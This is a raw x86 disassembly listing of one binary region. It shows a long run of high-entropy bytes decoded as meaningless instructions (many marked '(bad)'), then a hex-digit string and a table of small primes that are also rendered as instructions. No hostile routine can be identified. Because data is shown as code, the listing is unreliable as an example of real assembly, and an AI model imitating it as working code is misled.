  4015bd:	c7                   	(bad)
  4015be:	6c                   	insb   (%dx),%es:(%edi)
  4015bf:	99                   	cltd
  4015c0:	fd                   	std
  4015c1:	09 26                	or     %esp,(%esi)
  4015c3:	e7 8e                	out    %eax,$0x8e
  4015c5:	8d 23                	lea    (%ebx),%esp
  4015c7:	10 a9 6d 7e 5a 5b    	adc    %ch,0x5b5a7e6d(%ecx)
  4015cd:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4015ce:	81 2c 9a 50 77 9f 35 	subl   $0x359f7750,(%edx,%ebx,4)
  4015d5:	b4 4e                	mov    $0x4e,%ah
  4015d7:	3b e0                	cmp    %eax,%esp
  4015d9:	7e 2a                	jle    0x401605
  4015db:	16                   	push   %ss
  4015dc:	16                   	push   %ss
  4015dd:	b4 d0                	mov    $0xd0,%ah
  4015df:	b0 96                	mov    $0x96,%al
  4015e1:	12 8d fb 86 22 01    	adc    0x12286fb(%ebp),%cl
  4015e7:	50                   	push   %eax
  4015e8:	0e                   	push   %cs
  4015e9:	74 8c                	je     0x401577
  4015eb:	79 f5                	jns    0x4015e2
  4015ed:	bc d7 4f 60 75       	mov    $0x75604fd7,%esp
  4015f2:	27                   	daa
  4015f3:	0b e0                	or     %eax,%esp
  4015f5:	8d                   	lea    (bad),%ebx
  4015f6:	dc 1e                	fcompl (%esi)
  4015f8:	77 65                	ja     0x40165f
  4015fa:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4015fb:	3a 2a                	cmp    (%edx),%ch
  4015fd:	80 76 d4 af          	xorb   $0xaf,-0x2c(%esi)
  401601:	67 ab                	stos   %eax,%es:(%di)
  401603:	82 81 41 8f d1 ee 9a 	addb   $0x9a,-0x112e70bf(%ecx)
  40160a:	7b 34                	jnp    0x401640
  40160c:	5a                   	pop    %edx
  40160d:	39 c4                	cmp    %eax,%esp
  40160f:	11 ac d6 09 74 be b6 	adc    %ebp,-0x49418bf7(%esi,%edx,8)
  401616:	a9 66 43 74 c2       	test   $0xc2744366,%eax
  40161b:	91                   	xchg   %eax,%ecx
  40161c:	79 7d                	jns    0x40169b
  40161e:	be 3e 22 24 e3       	mov    $0xe324223e,%esi
  401623:	42                   	inc    %edx
  401624:	92                   	xchg   %eax,%edx
  401625:	16                   	push   %ss
  401626:	4c                   	dec    %esp
  401627:	d9 9a 0e 59 3c a9    	fstps  -0x56c3a6f2(%edx)
  40162d:	86 36                	xchg   %dh,(%esi)
  40162f:	73 16                	jae    0x401647
  401631:	33 20                	xor    (%eax),%esp
  401633:	53                   	push   %ebx
  401634:	b4 07                	mov    $0x7,%ah
  401636:	a0 84 c4 64 d7       	mov    0xd764c484,%al
  40163b:	37                   	aaa
  40163c:	69 78 e2 10 00 b5 c9 	imul   $0xc9b50010,-0x1e(%eax),%edi
  401643:	5b                   	pop    %ebx
  401644:	8e 30                	mov    (%eax),%?
  401646:	c7                   	(bad)
  401647:	ae                   	scas   %es:(%edi),%al
  401648:	53                   	push   %ebx
  401649:	7a 37                	jp     0x401682
  40164b:	01 b5 9a aa 47 24    	add    %esi,0x2447aa9a(%ebp)
  401651:	85 e7                	test   %esp,%edi
  401653:	ab                   	stos   %eax,%es:(%edi)
  401654:	21 2a                	and    %ebp,(%edx)
  401656:	0f 29 c5             	movaps %xmm0,%xmm5
  401659:	38 c8                	cmp    %cl,%al
  40165b:	01 7c 79 dc          	add    %edi,-0x24(%ecx,%edi,2)
  40165f:	15 1e bf 8d 6e       	adc    $0x6e8dbf1e,%eax
  401664:	c5 9f e1 90 3b ec    	lds    -0x13c46f1f(%edi),%ebx
  40166a:	d9 14 18             	fsts   (%eax,%ebx,1)
  40166d:	f9                   	stc
  40166e:	4d                   	dec    %ebp
  40166f:	be b7 b6 7c d4       	mov    $0xd47cb6b7,%esi
  401674:	c7                   	(bad)
  401675:	29 34 da             	sub    %esi,(%edx,%ebx,8)
  401678:	d5 01                	aad    $0x1
  40167a:	7d 14                	jge    0x401690
  40167c:	bb f0 74 38 7c       	mov    $0x7c3874f0,%ebx
  401681:	03 36                	add    (%esi),%esi
  401683:	c0 39 f3             	sarb   $0xf3,(%ecx)
  401686:	1b 51 0f             	sbb    0xf(%ecx),%edx
  401689:	6c                   	insb   (%dx),%es:(%edi)
  40168a:	ff                   	(bad)
  40168b:	3e 57                	ds push %edi
  40168d:	01 db                	add    %ebx,%ebx
  40168f:	ca 32 5f             	lret   $0x5f32
  401692:	08 44 90 ca          	or     %al,-0x36(%eax,%edx,4)
  401696:	ec                   	in     (%dx),%al
  401697:	56                   	push   %esi
  401698:	c3                   	ret
  401699:	9f                   	lahf
  40169a:	d9 a4 4e c1 1d 25 1f 	fldenv 0x1f251dc1(%esi,%ecx,2)
  4016a1:	3f                   	aas
  4016a2:	7d 85                	jge    0x401629
  4016a4:	78 fa                	js     0x4016a0
  4016a6:	de 50 fe             	ficoms -0x2(%eax)
  4016a9:	09 da                	or     %ebx,%edx
  4016ab:	7c 5e                	jl     0x40170b
  4016ad:	84 70 99             	test   %dh,-0x67(%eax)
  4016b0:	1b e0                	sbb    %eax,%esp
  4016b2:	86 d0                	xchg   %dl,%al
  4016b4:	5f                   	pop    %edi
  4016b5:	57                   	push   %edi
  4016b6:	f2 fe                	repnz (bad)
  4016b8:	a8 ae                	test   $0xae,%al
  4016ba:	6d                   	insl   (%dx),%es:(%edi)
  4016bb:	63 57 e0             	arpl   %edx,-0x20(%edi)
  4016be:	ca ae e1             	lret   $0xe1ae
  4016c1:	91                   	xchg   %eax,%ecx
  4016c2:	bb ee 16 7e 63       	mov    $0x637e16ee,%ebx
  4016c7:	9d                   	popf
  4016c8:	0b 24 43             	or     (%ebx,%eax,2),%esp
  4016cb:	50                   	push   %eax
  4016cc:	52                   	push   %edx
  4016cd:	d7                   	xlat   %ds:(%ebx)
  4016ce:	6b 55 0a e6          	imul   $0xffffffe6,0xa(%ebp),%edx
  4016d2:	8a 0f                	mov    (%edi),%cl
  4016d4:	08 31                	or     %dh,(%ecx)
  4016d6:	51                   	push   %ecx
  4016d7:	06                   	push   %es
  4016d8:	48                   	dec    %eax
  4016d9:	b4 06                	mov    $0x6,%ah
  4016db:	35 9a 2f 73 6e       	xor    $0x6e732f9a,%eax
  4016e0:	7b 6b                	jnp    0x40174d
  4016e2:	86 23                	xchg   %ah,(%ebx)
  4016e4:	98                   	cwtl
  4016e5:	ca 42 1c             	lret   $0x1c42
  4016e8:	30 79 59             	xor    %bh,0x59(%ecx)
  4016eb:	8a 62 36             	mov    0x36(%edx),%ah
  4016ee:	f9                   	stc
  4016ef:	9e                   	sahf
  4016f0:	a2 20 19 91 31       	mov    %al,0x31911920
  4016f5:	29 f4                	sub    %esi,%esp
  4016f7:	b4 01                	mov    $0x1,%ah
  4016f9:	07                   	pop    %es
  4016fa:	a9 fb d9 0c ca       	test   $0xca0cd9fb,%eax
  4016ff:	18 0f                	sbb    %cl,(%edi)
  401701:	db de                	fcmovnu %st(6),%st
  401703:	95                   	xchg   %eax,%ebp
  401704:	56                   	push   %esi
  401705:	eb ea                	jmp    0x4016f1
  401707:	26 5b                	es pop %ebx
  401709:	69 88 8c 78 ce dc 99 	imul   $0x34a36d99,-0x23318774(%eax),%ecx
  401710:	6d a3 34 
  401713:	29 21                	sub    %esp,(%ecx)
  401715:	65 e6 30             	gs out %al,$0x30
  401718:	1b ec                	sbb    %esp,%ebp
  40171a:	c5 64 68 99          	lds    -0x67(%eax,%ebp,2),%esp
  40171e:	0a 36                	or     (%esi),%dh
  401720:	a0 5b 5a a1 ae       	mov    0xaea15a5b,%al
  401725:	96                   	xchg   %eax,%esi
  401726:	c4 64 59 6c          	les    0x6c(%ecx,%ebx,2),%esp
  40172a:	cc                   	int3
  40172b:	77 0b                	ja     0x401738
  40172d:	e4 65                	in     $0x65,%al
  40172f:	05 fe 3c 36 b1       	add    $0xb1363cfe,%eax
  401734:	a2 d8 d5 af 22       	mov    %al,0x22afd5d8
  401739:	7c a9                	jl     0x4016e4
  40173b:	bb 9a 62 b3 f1       	mov    $0xf1b3629a,%ebx
  401740:	fc                   	cld
  401741:	62 14 04             	bound  %edx,(%esp,%eax,1)
  401744:	b5 23                	mov    $0x23,%ch
  401746:	d6                   	salc
  401747:	3e c9                	ds leave
  401749:	d9 e5                	fxam
  40174b:	6e                   	outsb  %ds:(%esi),(%dx)
  40174c:	58                   	pop    %eax
  40174d:	94                   	xchg   %eax,%esp
  40174e:	d0 e3                	shl    $1,%bl
  401750:	4f                   	dec    %edi
  401751:	15 a5 8d 25 6b       	adc    $0x6b258da5,%eax
  401756:	17                   	pop    %ss
  401757:	f5                   	cmc
  401758:	e7 7f                	out    %eax,$0x7f
  40175a:	ac                   	lods   %ds:(%esi),%al
  40175b:	27                   	daa
  40175c:	7b 91                	jnp    0x4016ef
  40175e:	6b 77 38 1a          	imul   $0x1a,0x38(%edi),%esi
  401762:	33 5b 47             	xor    0x47(%ebx),%ebx
  401765:	fe                   	(bad)
  401766:	2b 61 4d             	sub    0x4d(%ecx),%esp
  401769:	e7 66                	out    %eax,$0x66
  40176b:	ff 5c 3a dc          	lcall  *-0x24(%edx,%edi,1)
  40176f:	b9 89 1d 6a fe       	mov    $0xfe6a1d89,%ecx
  401774:	41                   	inc    %ecx
  401775:	91                   	xchg   %eax,%ecx
  401776:	48                   	dec    %eax
  401777:	4f                   	dec    %edi
  401778:	2d c6 ea 04 e5       	sub    $0xe504eac6,%eax
  40177d:	ff 70 51             	push   0x51(%eax)
  401780:	4e                   	dec    %esi
  401781:	b8 fe df df 67       	mov    $0x67dfdffe,%eax
  401786:	25 4a f8 6d c3       	and    $0xc36df84a,%eax
  40178b:	da 9b 54 0f 21 f4    	ficompl -0xbdef0ac(%ebx)
  401791:	58                   	pop    %eax
  401792:	73 97                	jae    0x40172b
  401794:	8c 4e 19             	mov    %cs,0x19(%esi)
  401797:	28 f8                	sub    %bh,%al
  401799:	90                   	nop
  40179a:	20 80 44 35 4a 24    	and    %al,0x244a3544(%eax)
  4017a0:	12 40 97             	adc    -0x69(%eax),%al
  4017a3:	fb                   	sti
  4017a4:	9e                   	sahf
  4017a5:	d4 ee                	aam    $0xee
  4017a7:	74 b6                	je     0x40175f
  4017a9:	50                   	push   %eax
  4017aa:	7b 0b                	jnp    0x4017b7
  4017ac:	f1                   	int1
  4017ad:	fa                   	cli
  4017ae:	3c 0f                	cmp    $0xf,%al
  4017b0:	11 b9 05 3b d7 12    	adc    %edi,0x12d73b05(%ecx)
  4017b6:	33 00                	xor    (%eax),%eax
  4017b8:	23 55 7e             	and    0x7e(%ebp),%edx
  4017bb:	d4 63                	aam    $0x63
  4017bd:	64 9e                	fs sahf
  4017bf:	0a 5b 66             	or     0x66(%ebx),%bl
  4017c2:	8f                   	(bad)
  4017c3:	cc                   	int3
  4017c4:	8b 81 02 42 af 8a    	mov    -0x7550bdfe(%ecx),%eax
  4017ca:	95                   	xchg   %eax,%ebp
  4017cb:	79 df                	jns    0x4017ac
  4017cd:	90                   	nop
  4017ce:	a3 0c cb dd 92       	mov    %eax,0x92ddcb0c
  4017d3:	69 1b 95 fc 73 f7    	imul   $0xf773fc95,(%ebx),%ebx
  4017d9:	82 18 be             	sbbb   $0xbe,(%eax)
  4017dc:	01 ce                	add    %ecx,%esi
  4017de:	bf dc 88 fe ec       	mov    $0xecfe88dc,%edi
  4017e3:	26 db 9e 55 00 76 95 	fistpl %es:-0x6a89ffab(%esi)
  4017ea:	11 e5                	adc    %esp,%ebp
  4017ec:	3e 49                	ds dec %ecx
  4017ee:	bb f1 f6 fe 7b       	mov    $0x7bfef6f1,%ebx
  4017f3:	c0 a3 c4 e6 cb f5 c1 	shlb   $0xc1,-0xa34193c(%ebx)
  4017fa:	aa                   	stos   %al,%es:(%edi)
  4017fb:	24 d4                	and    $0xd4,%al
  4017fd:	31 04 61             	xor    %eax,(%ecx,%eiz,2)
  401800:	f4                   	hlt
  401801:	a0 e2 39 96 28       	mov    0x289639e2,%al
  401806:	96                   	xchg   %eax,%esi
  401807:	96                   	xchg   %eax,%esi
  401808:	f7 82 18 be 01 ce bf 	testl  $0xfe88dcbf,-0x31fe41e8(%edx)
  40180f:	dc 88 fe 
  401812:	ec                   	in     (%dx),%al
  401813:	26 db 9e 55 00 65 1f 	fistpl %es:0x1f650055(%esi)
  40181a:	d6                   	salc
  40181b:	82 0a 4a             	orb    $0x4a,(%edx)
  40181e:	d3 4d c1             	rorl   %cl,-0x3f(%ebp)
  401821:	72 5f                	jb     0x401882
  401823:	ee                   	out    %al,(%dx)
  401824:	83 d5 f3             	adc    $0xfffffff3,%ebp
  401827:	b8 c9 64 50 cd       	mov    $0xcd5064c9,%eax
  40182c:	12 28                	adc    (%eax),%ch
  40182e:	fe                   	(bad)
  40182f:	79 0d                	jns    0x40183e
  401831:	ad                   	lods   %ds:(%esi),%eax
  401832:	67 31 3c             	xor    %edi,(%si)
  401835:	10 ca                	adc    %cl,%dl
  401837:	d0 d1                	rcl    $1,%cl
  401839:	80 d2 b7             	adc    $0xb7,%dl
  40183c:	c1 a5 06 04 eb 98 bc 	shll   $0xbc,-0x6714fbfa(%ebp)
  401843:	e1 44                	loope  0x401889
  401845:	76 d0                	jbe    0x401817
  401847:	cc                   	int3
  401848:	f8                   	clc
  401849:	80 6e c0 c2          	subb   $0xc2,-0x40(%esi)
  40184d:	e9 0c 07 32 ad       	jmp    0xad721f5e
  401852:	3b e4                	cmp    %esp,%esp
  401854:	62                   	(bad)
  401855:	fc                   	cld
  401856:	29 6e 13             	sub    %ebp,0x13(%esi)
  401859:	cf                   	iret
  40185a:	26 be ac e7 4d d8    	es mov $0xd84de7ac,%esi
  401860:	60                   	pusha
  401861:	0a f1                	or     %cl,%dh
  401863:	83 35 a4 b5 c5 da ee 	xorl   $0xffffffee,0xdac5b5a4
  40186a:	2e 45                	cs inc %ebp
  40186c:	76 38                	jbe    0x4018a6
  40186e:	0a e7                	or     %bh,%ah
  401870:	31 89 2c c0 b0 71    	xor    %ecx,0x71b0c02c(%ecx)
  401876:	af                   	scas   %es:(%edi),%eax
  401877:	63 47 12             	arpl   %eax,0x12(%edi)
  40187a:	c2 72 fe             	ret    $0xfe72
  40187d:	88 2f                	mov    %ch,(%edi)
  40187f:	84 32                	test   %dh,(%edx)
  401881:	c2 69 9a             	ret    $0x9a69
  401884:	88 7e 82             	mov    %bh,-0x7e(%esi)
  401887:	1f                   	pop    %ds
  401888:	76 17                	jbe    0x4018a1
  40188a:	61                   	popa
  40188b:	07                   	pop    %es
  40188c:	79 d4                	jns    0x401862
  40188e:	a1 fb a7 53 fe       	mov    0xfe53a7fb,%eax
  401893:	54                   	push   %esp
  401894:	93                   	xchg   %eax,%ebx
  401895:	b6 27                	mov    $0x27,%dh
  401897:	1a a0 72 e5 7c 63    	sbb    0x637ce572(%eax),%ah
  40189d:	15 37 ae 85 9c       	adc    $0x9c85ae37,%eax
  4018a2:	08 df                	or     %bl,%bh
  4018a4:	b7 0c                	mov    $0xc,%bh
  4018a6:	bf 49 ea 99 17       	mov    $0x1799ea49,%edi
  4018ab:	f9                   	stc
  4018ac:	34 61                	xor    $0x61,%al
  4018ae:	6f                   	outsl  %ds:(%esi),(%dx)
  4018af:	7c 82                	jl     0x401833
  4018b1:	f6 9a 52 f6 9c 45    	negb   0x459cf652(%edx)
  4018b7:	ed                   	in     (%dx),%eax
  4018b8:	34 59                	xor    $0x59,%al
  4018ba:	03 d1                	add    %ecx,%edx
  4018bc:	33 ba 18 39 62 36    	xor    0x36623918(%edx),%edi
  4018c2:	ea 77 b6 2e 6c d3 5e 	ljmp   $0x5ed3,$0x6c2eb677
  4018c9:	17                   	pop    %ss
  4018ca:	2e 38 80 db c0 e7 8f 	cmp    %al,%cs:-0x70183f25(%eax)
  4018d1:	36 cc                	ss int3
  4018d3:	40                   	inc    %eax
  4018d4:	d5 7a                	aad    $0x7a
  4018d6:	9f                   	lahf
  4018d7:	5c                   	pop    %esp
  4018d8:	e4 a8                	in     $0xa8,%al
  4018da:	13 69 3b             	adc    0x3b(%ecx),%ebp
  4018dd:	49                   	dec    %ecx
  4018de:	8e c9                	mov    %ecx,%cs
  4018e0:	37                   	aaa
  4018e1:	23 bb d0 c5 97 f2    	and    -0xd683a30(%ebx),%edi
  4018e7:	2d 8c b4 7f d2       	sub    $0xd27fb48c,%eax
  4018ec:	59                   	pop    %ecx
  4018ed:	62                   	(bad)
  4018ee:	f8                   	clc
  4018ef:	8b ff                	mov    %edi,%edi
  4018f1:	6f                   	outsl  %ds:(%esi),(%dx)
  4018f2:	89 28                	mov    %ebp,(%eax)
  4018f4:	b5 28                	mov    $0x28,%ch
  4018f6:	d7                   	xlat   %ds:(%ebx)
  4018f7:	ad                   	lods   %ds:(%esi),%eax
  4018f8:	ed                   	in     (%dx),%eax
  4018f9:	de 28                	fisubrs (%eax)
  4018fb:	8e 2c 6c             	mov    (%esp,%ebp,2),%gs
  4018fe:	32 a3 03 00 87 2a    	xor    0x2a870003(%ebx),%ah
  401904:	ad                   	lods   %ds:(%esi),%eax
  401905:	ce                   	into
  401906:	b3 eb                	mov    $0xeb,%bl
  401908:	32 b7 a5 f1 48 36    	xor    0x3648f1a5(%edi),%dh
  40190e:	68 aa 9f 62 8d       	push   $0x8d629faa
  401913:	52                   	push   %edx
  401914:	f7 ad 57 7f 96 4c    	imull  0x4c967f57(%ebp)
  40191a:	54                   	push   %esp
  40191b:	68 89 7b 0b 19       	push   $0x190b7b89
  401920:	3a b3 e1 61 52 24    	cmp    0x245261e1(%ebx),%dh
  401926:	90                   	nop
  401927:	00 00                	add    %al,(%eax)
  401929:	06                   	push   %es
  40192a:	00 00                	add    %al,(%eax)
  40192c:	a8 d6                	test   $0xd6,%al
  40192e:	40                   	inc    %eax
  40192f:	00 70 09             	add    %dh,0x9(%eax)
  401932:	00 00                	add    %al,(%eax)
  401934:	20 05 93 19 00 00    	and    %al,0x1993
	...
  401946:	00 00                	add    %al,(%eax)
  401948:	4c                   	dec    %esp
  401949:	19 40 00             	sbb    %eax,0x0(%eax)
  40194c:	30 31                	xor    %dh,(%ecx)
  40194e:	32 33                	xor    (%ebx),%dh
  401950:	34 35                	xor    $0x35,%al
  401952:	36 37                	ss aaa
  401954:	38 39                	cmp    %bh,(%ecx)
  401956:	41                   	inc    %ecx
  401957:	42                   	inc    %edx
  401958:	43                   	inc    %ebx
  401959:	44                   	inc    %esp
  40195a:	45                   	inc    %ebp
  40195b:	46                   	inc    %esi
  40195c:	00 00                	add    %al,(%eax)
  40195e:	00 00                	add    %al,(%eax)
  401960:	03 00                	add    (%eax),%eax
  401962:	00 00                	add    %al,(%eax)
  401964:	05 00 00 00 07       	add    $0x7000000,%eax
  401969:	00 00                	add    %al,(%eax)
  40196b:	00 0b                	add    %cl,(%ebx)
  40196d:	00 00                	add    %al,(%eax)
  40196f:	00 0d 00 00 00 11    	add    %cl,0x11000000
  401975:	00 00                	add    %al,(%eax)
  401977:	00 13                	add    %dl,(%ebx)
  401979:	00 00                	add    %al,(%eax)
  40197b:	00 17                	add    %dl,(%edi)
  40197d:	00 00                	add    %al,(%eax)
  40197f:	00 1d 00 00 00 1f    	add    %bl,0x1f000000
  401985:	00 00                	add    %al,(%eax)
  401987:	00 25 00 00 00 29    	add    %ah,0x29000000
  40198d:	00 00                	add    %al,(%eax)
  40198f:	00 2b                	add    %ch,(%ebx)
  401991:	00 00                	add    %al,(%eax)
  401993:	00 2f                	add    %ch,(%edi)
  401995:	00 00                	add    %al,(%eax)
  401997:	00 35 00 00 00 3b    	add    %dh,0x3b000000
  40199d:	00 00                	add    %al,(%eax)
  40199f:	00 3d 00 00 00 43    	add    %bh,0x43000000
  4019a5:	00 00                	add    %al,(%eax)
  4019a7:	00 47 00             	add    %al,0x0(%edi)
  4019aa:	00 00                	add    %al,(%eax)
  4019ac:	49                   	dec    %ecx
  4019ad:	00 00                	add    %al,(%eax)
  4019af:	00 4f 00             	add    %cl,0x0(%edi)
  4019b2:	00 00                	add    %al,(%eax)
  4019b4:	53                   	push   %ebx
  4019b5:	00 00                	add    %al,(%eax)
  4019b7:	00 59 00             	add    %bl,0x0(%ecx)
  4019ba:	00 00                	add    %al,(%eax)
  4019bc:	61                   	popa
  4019bd:	00 00                	add    %al,(%eax)
  4019bf:	00 65 00             	add    %ah,0x0(%ebp)
  4019c2:	00 00                	add    %al,(%eax)
  4019c4:	67 00 00             	add    %al,(%bx,%si)
  4019c7:	00 6b 00             	add    %ch,0x0(%ebx)
  4019ca:	00 00                	add    %al,(%eax)
  4019cc:	6d                   	insl   (%dx),%es:(%edi)
  4019cd:	00 00                	add    %al,(%eax)
  4019cf:	00 71 00             	add    %dh,0x0(%ecx)
  4019d2:	00 00                	add    %al,(%eax)
  4019d4:	7f 00                	jg     0x4019d6
  4019d6:	00 00                	add    %al,(%eax)
  4019d8:	83 00 00             	addl   $0x0,(%eax)
  4019db:	00 89 00 00 00 8b    	add    %cl,-0x75000000(%ecx)
  4019e1:	00 00                	add    %al,(%eax)
  4019e3:	00 95 00 00 00 97    	add    %dl,-0x69000000(%ebp)
  4019e9:	00 00                	add    %al,(%eax)
  4019eb:	00 9d 00 00 00 a3    	add    %bl,-0x5d000000(%ebp)
  4019f1:	00 00                	add    %al,(%eax)
  4019f3:	00 a7 00 00 00 ad    	add    %ah,-0x53000000(%edi)
  4019f9:	00 00                	add    %al,(%eax)
  4019fb:	00 b3 00 00 00 b5    	add    %dh,-0x4b000000(%ebx)
  401a01:	00 00                	add    %al,(%eax)
  401a03:	00 bf 00 00 00 c1    	add    %bh,-0x3f000000(%edi)
  401a09:	00 00                	add    %al,(%eax)
  401a0b:	00 c5                	add    %al,%ch
  401a0d:	00 00                	add    %al,(%eax)
  401a0f:	00 c7                	add    %al,%bh
  401a11:	00 00                	add    %al,(%eax)
  401a13:	00 d3                	add    %dl,%bl
  401a15:	00 00                	add    %al,(%eax)
  401a17:	00 df                	add    %bl,%bh
  401a19:	00 00                	add    %al,(%eax)
  401a1b:	00 e3                	add    %ah,%bl
  401a1d:	00 00                	add    %al,(%eax)
  401a1f:	00 e5                	add    %ah,%ch
  401a21:	00 00                	add    %al,(%eax)
  401a23:	00 e9                	add    %ch,%cl
  401a25:	00 00                	add    %al,(%eax)
  401a27:	00 ef                	add    %ch,%bh
  401a29:	00 00                	add    %al,(%eax)
  401a2b:	00 f1                	add    %dh,%cl
  401a2d:	00 00                	add    %al,(%eax)
  401a2f:	00 fb                	add    %bh,%bl
  401a31:	00 00                	add    %al,(%eax)
  401a33:	00 01                	add    %al,(%ecx)
  401a35:	01 00                	add    %eax,(%eax)
  401a37:	00 07                	add    %al,(%edi)
  401a39:	01 00                	add    %eax,(%eax)
  401a3b:	00 0d 01 00 00 0f    	add    %cl,0xf000001
  401a41:	01 00                	add    %eax,(%eax)
  401a43:	00 15 01 00 00 19    	add    %dl,0x19000001
  401a49:	01 00                	add    %eax,(%eax)
  401a4b:	00 1b                	add    %bl,(%ebx)
  401a4d:	01 00                	add    %eax,(%eax)
  401a4f:	00 25 01 00 00 33    	add    %ah,0x33000001
  401a55:	01 00                	add    %eax,(%eax)
  401a57:	00 37                	add    %dh,(%edi)
  401a59:	01 00                	add    %eax,(%eax)
  401a5b:	00 39                	add    %bh,(%ecx)
  401a5d:	01 00                	add    %eax,(%eax)
  401a5f:	00 3d 01 00 00 4b    	add    %bh,0x4b000001
  401a65:	01 00                	add    %eax,(%eax)
  401a67:	00 51 01             	add    %dl,0x1(%ecx)
  401a6a:	00 00                	add    %al,(%eax)
  401a6c:	5b                   	pop    %ebx
  401a6d:	01 00                	add    %eax,(%eax)
  401a6f:	00 5d 01             	add    %bl,0x1(%ebp)
  401a72:	00 00                	add    %al,(%eax)
  401a74:	61                   	popa
  401a75:	01 00                	add    %eax,(%eax)
  401a77:	00 67 01             	add    %ah,0x1(%edi)
  401a7a:	00 00                	add    %al,(%eax)
  401a7c:	6f                   	outsl  %ds:(%esi),(%dx)
  401a7d:	01 00                	add    %eax,(%eax)
  401a7f:	00 75 01             	add    %dh,0x1(%ebp)
  401a82:	00 00                	add    %al,(%eax)
  401a84:	7b 01                	jnp    0x401a87
  401a86:	00 00                	add    %al,(%eax)
  401a88:	7f 01                	jg     0x401a8b
  401a8a:	00 00                	add    %al,(%eax)
  401a8c:	85 01                	test   %eax,(%ecx)
  401a8e:	00 00                	add    %al,(%eax)
  401a90:	8d 01                	lea    (%ecx),%eax
  401a92:	00 00                	add    %al,(%eax)
  401a94:	91                   	xchg   %eax,%ecx
  401a95:	01 00                	add    %eax,(%eax)
  401a97:	00 99 01 00 00 a3    	add    %bl,-0x5cffffff(%ecx)
  401a9d:	01 00                	add    %eax,(%eax)
  401a9f:	00 a5 01 00 00 af    	add    %ah,-0x50ffffff(%ebp)
  401aa5:	01 00                	add    %eax,(%eax)
  401aa7:	00 b1 01 00 00 b7    	add    %dh,-0x48ffffff(%ecx)
  401aad:	01 00                	add    %eax,(%eax)
  401aaf:	00 bb 01 00 00 c1    	add    %bh,-0x3effffff(%ebx)
  401ab5:	01 00                	add    %eax,(%eax)
  401ab7:	00 c9                	add    %cl,%cl
  401ab9:	01 00                	add    %eax,(%eax)
  401abb:	00 cd                	add    %cl,%ch
  401abd:	01 00                	add    %eax,(%eax)
  401abf:	00 cf                	add    %cl,%bh
  401ac1:	01 00                	add    %eax,(%eax)
  401ac3:	00 d3                	add    %dl,%bl
  401ac5:	01 00                	add    %eax,(%eax)
  401ac7:	00 df                	add    %bl,%bh
  401ac9:	01 00                	add    %eax,(%eax)
  401acb:	00 e7                	add    %ah,%bh
  401acd:	01 00                	add    %eax,(%eax)
  401acf:	00 eb                	add    %ch,%bl
  401ad1:	01 00                	add    %eax,(%eax)
  401ad3:	00 f3                	add    %dh,%bl
  401ad5:	01 00                	add    %eax,(%eax)
  401ad7:	00 f7                	add    %dh,%bh
  401ad9:	01 00                	add    %eax,(%eax)
  401adb:	00 fd                	add    %bh,%ch
  401add:	01 00                	add    %eax,(%eax)
  401adf:	00 09                	add    %cl,(%ecx)
  401ae1:	02 00                	add    (%eax),%al
  401ae3:	00 0b                	add    %cl,(%ebx)
  401ae5:	02 00                	add    (%eax),%al
  401ae7:	00 1d 02 00 00 23    	add    %bl,0x23000002
  401aed:	02 00                	add    (%eax),%al
  401aef:	00 2d 02 00 00 33    	add    %ch,0x33000002
  401af5:	02 00                	add    (%eax),%al
  401af7:	00 39                	add    %bh,(%ecx)
  401af9:	02 00                	add    (%eax),%al
  401afb:	00 3b                	add    %bh,(%ebx)
  401afd:	02 00                	add    (%eax),%al
  401aff:	00 41 02             	add    %al,0x2(%ecx)
  401b02:	00 00                	add    %al,(%eax)
  401b04:	4b                   	dec    %ebx
  401b05:	02 00                	add    (%eax),%al
  401b07:	00 51 02             	add    %dl,0x2(%ecx)
  401b0a:	00 00                	add    %al,(%eax)
  401b0c:	57                   	push   %edi
  401b0d:	02 00                	add    (%eax),%al
  401b0f:	00 59 02             	add    %bl,0x2(%ecx)
  401b12:	00 00                	add    %al,(%eax)
  401b14:	5f                   	pop    %edi
  401b15:	02 00                	add    (%eax),%al
  401b17:	00 65 02             	add    %ah,0x2(%ebp)
  401b1a:	00 00                	add    %al,(%eax)
  401b1c:	69 02 00 00 6b 02    	imul   $0x26b0000,(%edx),%eax
  401b22:	00 00                	add    %al,(%eax)
  401b24:	77 02                	ja     0x401b28
  401b26:	00 00                	add    %al,(%eax)
  401b28:	81 02 00 00 83 02    	addl   $0x2830000,(%edx)
  401b2e:	00 00                	add    %al,(%eax)
  401b30:	87 02                	xchg   %eax,(%edx)
  401b32:	00 00                	add    %al,(%eax)
  401b34:	8d 02                	lea    (%edx),%eax
  401b36:	00 00                	add    %al,(%eax)
  401b38:	93                   	xchg   %eax,%ebx
  401b39:	02 00                	add    (%eax),%al
  401b3b:	00 95 02 00 00 a1    	add    %dl,-0x5efffffe(%ebp)
  401b41:	02 00                	add    (%eax),%al
  401b43:	00 a5 02 00 00 ab    	add    %ah,-0x54fffffe(%ebp)
  401b49:	02 00                	add    (%eax),%al
  401b4b:	00 b3 02 00 00 bd    	add    %dh,-0x42fffffe(%ebx)
  401b51:	02 00                	add    (%eax),%al
  401b53:	00 c5                	add    %al,%ch
  401b55:	02 00                	add    (%eax),%al
  401b57:	00 cf                	add    %cl,%bh
  401b59:	02 00                	add    (%eax),%al
  401b5b:	00 d7                	add    %dl,%bh
  401b5d:	02 00                	add    (%eax),%al
  401b5f:	00 dd                	add    %bl,%ch
  401b61:	02 00                	add    (%eax),%al
  401b63:	00 e3                	add    %ah,%bl
  401b65:	02 00                	add    (%eax),%al
  401b67:	00 e7                	add    %ah,%bh
  401b69:	02 00                	add    (%eax),%al
  401b6b:	00 ef                	add    %ch,%bh
  401b6d:	02 00                	add    (%eax),%al
  401b6f:	00 f5                	add    %dh,%ch
  401b71:	02 00                	add    (%eax),%al
  401b73:	00 f9                	add    %bh,%cl
  401b75:	02 00                	add    (%eax),%al
  401b77:	00 01                	add    %al,(%ecx)
  401b79:	03 00                	add    (%eax),%eax
  401b7b:	00 05 03 00 00 13    	add    %al,0x13000003
  401b81:	03 00                	add    (%eax),%eax
  401b83:	00 1d 03 00 00 29    	add    %bl,0x29000003
  401b89:	03 00                	add    (%eax),%eax
  401b8b:	00 2b                	add    %ch,(%ebx)
  401b8d:	03 00                	add    (%eax),%eax
  401b8f:	00 35 03 00 00 37    	add    %dh,0x37000003
  401b95:	03 00                	add    (%eax),%eax
  401b97:	00 3b                	add    %bh,(%ebx)
  401b99:	03 00                	add    (%eax),%eax
  401b9b:	00 3d 03 00 00 47    	add    %bh,0x47000003
  401ba1:	03 00                	add    (%eax),%eax
